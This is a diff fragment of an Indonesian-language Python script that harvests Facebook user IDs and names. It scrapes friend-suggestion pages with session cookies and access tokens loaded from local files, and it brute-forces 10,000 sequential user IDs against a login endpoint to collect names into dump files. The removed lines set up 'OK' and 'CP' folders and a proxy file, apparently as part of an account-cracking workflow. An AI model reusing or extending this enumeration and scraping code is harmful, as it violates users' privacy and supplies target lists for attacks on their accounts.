+        try: self.scrape_suggestion('https://mbasic.facebook.com/friends/center/suggestions')
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def scrape_suggestion(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for p in req.find_all('a',href=True):
+                try:
+                    if "friends/hovercard/mbasic" in str(p['href']):
+                        id   = p['href'].split('&')[0].split('=')[1]
+                        nama = p.text
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    if format in self.dump: pass
+                    else: self.dump.append(format)
+                    animasi()
+                except Exception as e: pass
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat selengkapnya')['href']
+            self.scrape_suggestion(nek)
+        except Exception as e: pass
+
+#--> Dump Random Email, Phone, Username, ID
+class dump_random:
+    
+    #--> Penampungan Awal
+    def __init__(self,tp):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        if tp   == 'EM': self.main_email()    #--> Random Email
+        elif tp == 'PO': self.main_phone()    #--> Random Phone
+        elif tp == 'US': self.main_username() #--> Random Username
+        elif tp == 'ID': self.main_id()       #--> Random ID
+    
+    #--> Auto Generate Random Email
+    def main_email(self):
+        belum_bisa()
+
+    #--> Auto Generate Random Phone
+    def main_phone(self):
+        belum_bisa()
+
+    #--> Auto Generate Random Username
+    def main_username(self):
+        belum_bisa()
+
+    #--> Auto Generate Random ID
+    def main_id(self):
+        aw = input('Masukkan ID Awal Sbg Acuan : ')
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        try:
+            self.tamp(int(aw))
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def tamp(self,a):
+        t = a+10000
+        r = random.sample(range(a,t), t-a)
+        r.append(t)
+        r.sort()
+        for n in r:
+            self.cek_id(n)
+    def cek_id(self,id):
+        url = 'https://mbasic.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr'%(id)
+        try:
+            req = bs(self.xyz.get(url).content,'html.parser')
+            if "Sorry, this content isn't available right now" in req: pass
+            elif 'Temporarily Blocked' in str(req):
+                print('\rAkunmu Kena Spam',end=''); sys.stdout.flush()
+            else:
+                nama = req.find_all('img')[1]['alt'].split(',')[0]
+                if nama == 'Foto Profil Pengguna': pass
+                elif nama == '': pass
+                else:
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    self.dump.append(format)
+                    animasi()
+        except Exception as e: pass
+
+#--> Simpan File Ke Perangkat
+class simpan_file:
+    def __init__(self):
+        self.main()
+    def main(self):
+        print('')
+        ty = input('Simpan File? [y/t] : ').lower()
+        if ty in ['1','01','y','ya','iya']: self.main2()
+        else: pass
+    def main2(self):
+        try:os.mkdir('dump')
+        except:pass
+        try:
+            nm  = input('Tulis Nama File : ').replace(' ','_') + '.txt'
+            lk  = input('Tulis Lokasi Penyimpanan : ')
+            lok = '%s\%s'%(lk,nm)
+            open(lok,'a+')
+            for d in dump:
+                try: open(lok,'a+').write(d+'\n')
+                except Exception as e: pass
+            print('\nFile Dump Tersimpan Di %s'%(lok))
+        except Exception as e:
+            print('\nGagal Menemukan Lokasi File')
+            lok = 'dump/%s.txt'%(tanggal)
+            open(lok,'a+')
+            for d in dump:
+                try: open(lok,'a+').write(d+'\n')
+                except Exception as e: pass
+            print('File Dump Tersimpan Di %s'%(lok))
+
+#--> Warning
+def belum_bisa():
+    print('Sorry Bos, Fiturnya Belum Tersedia\nMasih Pusing Mikirin Logikanya\nDoakan Semoga Cepat Selesai Yaa!\nSemoga SC Ini Bisa Membantu Orang Banyak...\nTerima Kasih!\n\n- Dapunta Khurayra X')
+    finish()
+    exit()
+
+#--> Trigger
+if __name__ == '__main__':
     clear()
-    jalan(f"{M}SELAMAT BERSENANG SENANG")
+    start()
     login()
-#-----------------------[ SYSTEM-CONTROL ]--------------------#
-if __name__=='__main__':
-	try:os.system('git pull')
-	except:pass
-	try:os.mkdir('OK')
-	except:pass
-	try:os.mkdir('CP')
-	except:pass
-	try:os.system('touch .prox.txt')
-	except:pass
-	Selamat()
+    finish()
